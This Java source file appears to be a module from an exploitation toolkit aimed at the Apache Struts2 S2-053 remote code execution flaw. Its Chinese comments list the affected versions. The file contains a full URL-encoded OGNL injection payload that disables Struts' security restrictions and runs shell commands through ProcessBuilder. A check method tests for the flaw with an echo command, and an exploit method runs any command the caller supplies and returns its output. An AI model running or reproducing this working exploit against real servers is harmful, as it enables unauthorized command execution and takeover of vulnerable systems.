package Module;

import Framework.HTTPinterface;

/**
 * S2-053 远程代码执行漏洞
 * 影响版本: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10
 * 漏洞详情:
 * http://struts.apache.org/docs/s2-053.html
 * https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e
 * Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，
 * 但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
 */

public class S2_053_RCE {
    public static Boolean check(String url) {
        try {
            String result = HTTPinterface.POST(url,
                    "redirectUri"+"=%25%7B%28%23dm%3D%40ognl." +
                            "OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_" +
                            "memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com." +
                            "opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23" +
                            "container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29." +
                            "%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29." +
                            "%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context." +
                            "setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo 112233%27%29." +
                            "%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os." +
                            "name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29." +
                            "%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23" +
                            "cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29." +
                            "%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p." +
                            "redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29." +
                            "%28%40org.apache.commons.io.IOUtils%40toString%28%23process." +
                            "getInputStream%28%29%29%29%7D%0D%0A");
            if (result.contains("112233")) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url,String cmd){
        try{
            String result = HTTPinterface.POST(url,
                    "redirectUri"+"=%25%7B%28%23dm%3D%40ognl." +
                            "OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_" +
                            "memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com." +
                            "opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23" +
                            "container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29." +
                            "%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29." +
                            "%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context." +
                            "setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27"+cmd+"%27%29." +
                            "%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os." +
                            "name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29." +
                            "%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23" +
                            "cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29." +
                            "%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p." +
                            "redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29." +
                            "%28%40org.apache.commons.io.IOUtils%40toString%28%23process." +
                            "getInputStream%28%29%29%29%7D%0D%0A");
            //result = result.substring(result.indexOf("</p>"));    //去除多余输出，如果需要读取完整回显，注释该行即可
            return result;
        }catch (Exception e){
            return "[-]访问出错";
        }
    }
}
